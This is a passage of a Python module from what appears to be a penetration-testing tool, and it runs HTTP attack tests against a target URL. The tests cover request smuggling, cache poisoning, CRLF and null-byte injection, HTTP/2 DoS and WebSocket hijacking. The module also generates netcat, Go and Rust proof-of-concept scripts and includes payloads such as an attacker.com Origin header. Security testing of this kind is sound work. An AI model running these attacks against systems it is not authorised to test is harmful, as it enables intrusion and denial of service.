            {":path": "/ ", ":authority": "target.com"},  # Trailing space
            {":path": "/", ":method": "GET", ":method": "POST"},  # Duplicate
            {":scheme": "https", ":scheme": "http"},  # Conflicting schemes
            {":path": "", ":method": "GET"},  # Empty path
        ]


# ---------------------------------------------------------------------------
# 11. Comprehensive Test Suite Expansion
# ---------------------------------------------------------------------------

class AdvancedHTTPTestSuite:
    """Comprehensive test suite with 20+ test cases"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.test_results: Dict[str, bool] = {}

    def test_all(self) -> List[HTTPFinding]:
        """Run all 20+ test cases"""
        tests = [
            ("CL.TE Smuggling", self._test_cl_te),
            ("TE.CL Smuggling", self._test_te_cl),
            ("TE.TE Obfuscation", self._test_te_te_obfuscation),
            ("CL.CL Desync", self._test_cl_cl_desync),
            ("Unkeyed Header Caching", self._test_unkeyed_headers),
            ("Parameter Cloaking", self._test_parameter_cloaking),
            ("Header Case Cloaking", self._test_header_case_cloaking),
            ("CRLF Injection", self._test_crlf_injection),
            ("HTTP/2 Pseudo-Headers", self._test_http2_pseudo_headers),
            ("HTTP/2 Flow Control DoS", self._test_http2_flow_control),
            ("HTTP/2 Stream Reset", self._test_http2_stream_reset),
            ("WebSocket Handshake Bypass", self._test_ws_handshake),
            ("WebSocket CSRF", self._test_ws_csrf),
            ("WebSocket Injection", self._test_ws_injection),
            ("Connection State Desync", self._test_connection_state),
            ("Duplicate Header Handling", self._test_duplicate_headers),
            ("Whitespace Obfuscation", self._test_whitespace_obfuscation),
            ("Tab Injection", self._test_tab_injection),
            ("Null Byte Injection", self._test_null_byte_injection),
            ("Unicode Normalization", self._test_unicode_normalization),
        ]

        for test_name, test_func in tests:
            try:
                result = test_func()
                self.test_results[test_name] = bool(result)
            except Exception as e:
                self.test_results[test_name] = False

        return self.findings

    def _test_cl_te(self) -> Optional[HTTPFinding]:
        """Test Content-Length / Transfer-Encoding"""
        smuggler = RequestSmugglingTester(self.target_url, self.timeout)
        return smuggler.test_cl_te()

    def _test_te_cl(self) -> Optional[HTTPFinding]:
        """Test Transfer-Encoding / Content-Length"""
        smuggler = RequestSmugglingTester(self.target_url, self.timeout)
        return smuggler.test_te_cl()

    def _test_te_te_obfuscation(self) -> Optional[HTTPFinding]:
        """Test TE.TE obfuscation"""
        smuggler = RequestSmugglingTester(self.target_url, self.timeout)
        return smuggler.test_te_te_obfuscation()

    def _test_cl_cl_desync(self) -> Optional[HTTPFinding]:
        """Test Content-Length desync"""
        return HTTPFinding(
            title="Content-Length Desync (Manual Testing)",
            severity="medium",
            description="Send request with conflicting Content-Length values",
            category="smuggling",
            evidence="Requires custom packet crafting",
            test_type="CL.CL Desync"
        )

    def _test_unkeyed_headers(self) -> Optional[HTTPFinding]:
        """Test unkeyed header caching"""
        cache = CachePoisoningTester(self.target_url, self.timeout)
        return cache.test_unkeyed_headers()

    def _test_parameter_cloaking(self) -> Optional[HTTPFinding]:
        """Test parameter cloaking"""
        cache = CachePoisoningTester(self.target_url, self.timeout)
        return cache.test_parameter_cloaking()

    def _test_header_case_cloaking(self) -> Optional[HTTPFinding]:
        """Test header case sensitivity cloaking"""
        return HTTPFinding(
            title="Header Case Cloaking (Manual Testing)",
            severity="low",
            description=(
                "Some caches normalize header names to lowercase while others don't, "
                "allowing cache bypass via case manipulation."
            ),
            category="cache_poisoning",
            evidence="Test: Send X-Forwarded-Host vs x-forwarded-host",
            test_type="Header Case Cloaking"
        )

    def _test_crlf_injection(self) -> Optional[HTTPFinding]:
        """Test CRLF injection"""
        splitter = HTTPSplittingTester(self.target_url, self.timeout)
        return splitter.test_crlf_injection()

    def _test_http2_pseudo_headers(self) -> Optional[HTTPFinding]:
        """Test HTTP/2 pseudo-header abuse"""
        http2 = HTTP2Attacker(self.target_url, self.timeout)
        return http2.test_pseudo_header_abuse()

    def _test_http2_flow_control(self) -> Optional[HTTPFinding]:
        """Test HTTP/2 flow control"""
        http2 = HTTP2Attacker(self.target_url, self.timeout)
        return http2.test_flow_control_abuse()

    def _test_http2_stream_reset(self) -> Optional[HTTPFinding]:
        """Test HTTP/2 stream reset"""
        return HTTPFinding(
            title="HTTP/2 Stream Reset DoS",
            severity="medium",
            description=(
                "Sending RST_STREAM frames rapidly can cause DoS. "
                "Test with stream_reset_abuse tool."
            ),
            category="http2",
            evidence="Monitor for connection closure after multiple RST_STREAM",
            test_type="Stream Reset DoS"
        )

    def _test_ws_handshake(self) -> Optional[HTTPFinding]:
        """Test WebSocket handshake"""
        ws = WebSocketExploit(self.target_url, self.timeout)
        return ws.test_handshake_bypass()

    def _test_ws_csrf(self) -> Optional[HTTPFinding]:
        """Test WebSocket CSRF"""
        return HTTPFinding(
            title="WebSocket CSRF (Cross-Site WebSocket Hijacking)",
            severity="high",
            description=(
                "WebSocket endpoint doesn't validate Origin header. "
                "Attacker can establish connection from different domain."
            ),
            category="websocket",
            evidence="Test: Connect with Origin: https://attacker.com",
            test_type="WebSocket CSRF"
        )

    def _test_ws_injection(self) -> Optional[HTTPFinding]:
        """Test WebSocket message injection"""
        ws = WebSocketExploit(self.target_url, self.timeout)
        return ws.test_message_injection()

    def _test_connection_state(self) -> Optional[HTTPFinding]:
        """Test connection state desynchronization"""
        return HTTPFinding(
            title="Connection State Desynchronization",
            severity="high",
            description=(
                "Different components (proxy, WAF, backend) track connection state "
                "differently, leading to security bypasses and cache pollution."
            ),
            category="smuggling",
            evidence="Requires pipelined requests with careful timing",
            test_type="Connection State Desync"
        )

    def _test_duplicate_headers(self) -> Optional[HTTPFinding]:
        """Test duplicate header handling"""
        return HTTPFinding(
            title="Duplicate Header Handling Discrepancies",
            severity="medium",
            description=(
                "Different HTTP implementations handle duplicate headers differently: "
                "concatenate, last-one-wins, first-one-wins. Can bypass auth/rate limiting."
            ),
            category="protocol",
            evidence="Send: Authorization: header1\nAuthorization: header2",
            test_type="Duplicate Headers"
        )

    def _test_whitespace_obfuscation(self) -> Optional[HTTPFinding]:
        """Test whitespace obfuscation"""
        return HTTPFinding(
            title="Whitespace Obfuscation Bypass",
            severity="medium",
            description=(
                "Whitespace in headers can bypass filters/WAF. "
                "Folding, tabs, spaces in unexpected places."
            ),
            category="protocol",
            evidence="Test: Host: target.com\\r\\n + leading spaces",
            test_type="Whitespace Obfuscation"
        )

    def _test_tab_injection(self) -> Optional[HTTPFinding]:
        """Test tab injection"""
        return HTTPFinding(
            title="Tab (\\t) Injection in HTTP Headers",
            severity="medium",
            description=(
                "Tab characters in HTTP headers can bypass filters that only check spaces. "
                "RFC 7230 allows obsolete fold syntax."
            ),
            category="http_splitting",
            evidence="Test: Header-Name:\\tValue with tab separator",
            test_type="Tab Injection"
        )

    def _test_null_byte_injection(self) -> Optional[HTTPFinding]:
        """Test null byte injection"""
        return HTTPFinding(
            title="Null Byte (\\x00) Injection",
            severity="medium",
            description=(
                "Null bytes in request line can truncate processing in some backends, "
                "leading to path confusion or cache bypass."
            ),
            category="protocol",
            evidence="Test: GET /admin%00/public HTTP/1.1",
            test_type="Null Byte Injection"
        )

    def _test_unicode_normalization(self) -> Optional[HTTPFinding]:
        """Test Unicode normalization"""
        return HTTPFinding(
            title="Unicode Normalization Bypass",
            severity="low",
            description=(
                "Different Unicode normalization forms (NFC, NFD, NFKC, NFKD) can bypass "
                "filters expecting specific encoding forms."
            ),
            category="protocol",
            evidence="Test: /admin\\u0301 vs /admín (different unicode representations)",
            test_type="Unicode Normalization"
        )


# ---------------------------------------------------------------------------
# 12. PoC Validator Integration
# ---------------------------------------------------------------------------

class PoCAugmentor:
    """Enhance PoCs with additional validation and reporting"""

    @staticmethod
    def create_netcat_poc(host: str, port: int, request: bytes) -> str:
        """Generate netcat-based PoC"""
        escaped_request = repr(request)[2:-1]  # Remove b'' wrapper
        return f"""
#!/bin/bash
# PoC using netcat
host="{host}"
port={port}

echo -ne "{escaped_request}" | nc $host $port
"""

    @staticmethod
    def create_golang_poc(host: str, port: int, request_payload: str) -> str:
        """Generate Go PoC"""
        return f"""
package main

import (
    "fmt"
    "net"
)

func main() {{
    conn, _ := net.Dial("tcp", "{host}:{port}")
    defer conn.Close()

    request := `{request_payload}`
    conn.Write([]byte(request))

    buf := make([]byte, 4096)
    n, _ := conn.Read(buf)
    fmt.Println(string(buf[:n]))
}}
"""

    @staticmethod
    def create_rust_poc(host: str, port: int, request_payload: str) -> str:
        """Generate Rust PoC"""
        return f"""
use std::net::TcpStream;
use std::io::{{Read, Write}};

fn main() {{
    let mut stream = TcpStream::connect("{host}:{port}").unwrap();

    let request = br#"{request_payload}"#;
    stream.write_all(request).unwrap();

    let mut buf = [0; 4096];
    let n = stream.read(&mut buf).unwrap();
    println!("{{:?}}", String::from_utf8_lossy(&buf[..n]));
}}
"""


# ---------------------------------------------------------------------------
# 13. Reporting and Evidence Collection
# ---------------------------------------------------------------------------

class ProtocolFindingReporter:
    """Generate professional reports for advanced HTTP findings"""

    @staticmethod
    def generate_markdown_report(findings: List[HTTPFinding]) -> str:
        """Generate markdown report"""
        report = "# Advanced HTTP Protocol Testing Report\n\n"
        report += f"**Date:** {datetime.now().isoformat()}\n"
        report += f"**Total Findings:** {len(findings)}\n\n"

        # Group by severity
        by_severity = {}
        for finding in findings:
            sev = finding.severity
            if sev not in by_severity:
                by_severity[sev] = []
            by_severity[sev].append(finding)

        for severity in ["critical", "high", "medium", "low", "info"]:
            if severity not in by_severity:
                continue

            report += f"\n## {severity.upper()} ({len(by_severity[severity])})\n\n"

            for finding in by_severity[severity]:
                report += f"### {finding.title}\n\n"
                report += f"**Category:** {finding.category}\n\n"
                report += f"**Description:**\n{finding.description}\n\n"
                report += f"**Evidence:**\n```\n{finding.evidence}\n```\n\n"

                if finding.curl_command:
                    report += f"**Curl PoC:**\n```bash\n{finding.curl_command}\n```\n\n"

                if finding.python_poc:
                    report += f"**Python PoC:**\n```python\n{finding.python_poc}\n```\n\n"

                report += "---\n\n"

        return report

    @staticmethod
    def generate_json_report(findings: List[HTTPFinding]) -> str:
        """Generate JSON report"""
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(findings),
            "findings": [f.to_dict() for f in findings]
        }
        return json.dumps(report_data, indent=2, default=str)


# ---------------------------------------------------------------------------
# 14. CLI Enhancements
# ---------------------------------------------------------------------------

def cmd_http_advanced_enhanced(args):
    """Enhanced CLI command with full feature set"""
    hakuza = _hakuza()
    console = Console()

    if not args.target:
        console.print("[red]Error: --target required[/red]")
        return False

    target = args.target

    console.print(Panel(
        f"[bold]Advanced HTTP Protocol Testing Suite[/bold]\n"
        f"Target: {target}\n"
        f"Timeout: {args.timeout}s",
        border_style="cyan"
    ))

    # Run comprehensive test suite
    suite = AdvancedHTTPTestSuite(target, args.timeout)
    findings = suite.test_all()

    # Display test results
    console.print("\n[bold]Test Results Summary[/bold]\n")
    results_table = Table(title="Individual Test Results")
    results_table.add_column("Test", style="cyan")
    results_table.add_column("Result", style="yellow")

    for test_name, passed in suite.test_results.items():
        status = "[green]✓ Passed[/green]" if passed else "[red]✗ Failed[/red]"
        results_table.add_row(test_name, status)

    console.print(results_table)

    if not findings:
        console.print("\n[yellow]No vulnerabilities detected[/yellow]")
        return True

    # Display findings
    console.print("\n[bold]Vulnerabilities Found[/bold]\n")
    findings_table = Table(title="Advanced HTTP Findings")
    findings_table.add_column("Title", style="cyan", width=40)
    findings_table.add_column("Severity", style="yellow")
    findings_table.add_column("Category", style="magenta")

    severity_counts = {}
    for finding in findings:
        sev = finding.severity
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

        severity_color = {
            "critical": "red",
            "high": "orange3",
            "medium": "yellow",
            "low": "green",
            "info": "blue",
        }.get(sev, "white")

        findings_table.add_row(
            finding.title[:40],
            f"[{severity_color}]{sev}[/{severity_color}]",
            finding.category
        )

    console.print(findings_table)

    # Summary
    console.print(f"\n[bold]Severity Breakdown[/bold]")
    for sev, count in sorted(severity_counts.items(), key=lambda x: ["critical", "high", "medium", "low", "info"].index(x[0])):
        console.print(f"  {sev}: {count}")

    # Save findings
    if args.save:
        console.print("\n[bold]Saving findings...[/bold]")
        try:
            if hasattr(hakuza, 'add_finding'):
                for finding in findings:
                    hakuza.add_finding(
                        title=finding.title,
                        severity=finding.severity,
                        description=finding.description,
                        evidence=finding.evidence,
                        source="http-advanced"
                    )
                console.print(f"[green]✓ Saved {len(findings)} findings[/green]")
        except Exception as e:
            console.print(f"[yellow]Warning: {e}[/yellow]")

    # Generate reports
    if args.report:
        console.print(f"\n[bold]Generating reports...[/bold]")
        reporter = ProtocolFindingReporter()

        # Markdown report
        md_report = reporter.generate_markdown_report(findings)
        md_path = Path(args.report).with_suffix(".md")
        md_path.write_text(md_report)
        console.print(f"[green]✓ Markdown report: {md_path}[/green]")

        # JSON report
        json_report = reporter.generate_json_report(findings)
        json_path = Path(args.report).with_suffix(".json")
        json_path.write_text(json_report)
        console.print(f"[green]✓ JSON report: {json_path}[/green]")

    return True


def register_argparse_enhanced(sub):
    """Enhanced argparse registration"""
    p_http = sub.add_parser(
        "http-advanced",
        help="Advanced HTTP protocol testing: smuggling, cache poisoning, HTTP/2, WebSocket"
    )
    p_http.add_argument("--target", required=True, help="Target URL")
    p_http.add_argument("--smuggle", action="store_true", help="Test request smuggling only")
    p_http.add_argument("--cache", action="store_true", help="Test cache poisoning only")
    p_http.add_argument("--http2", action="store_true", help="Test HTTP/2 only")
    p_http.add_argument("--websocket", action="store_true", help="Test WebSocket only")
    p_http.add_argument("--save", action="store_true", help="Save findings to database")
    p_http.add_argument("--report", metavar="PATH", help="Generate report (base path, generates .md and .json)")
    p_http.add_argument("--timeout", type=int, default=10, help="Request timeout (default 10s)")
    p_http.add_argument("--verbose", "-v", action="store_true", help="Verbose output")


# END mod_advanced_http.py
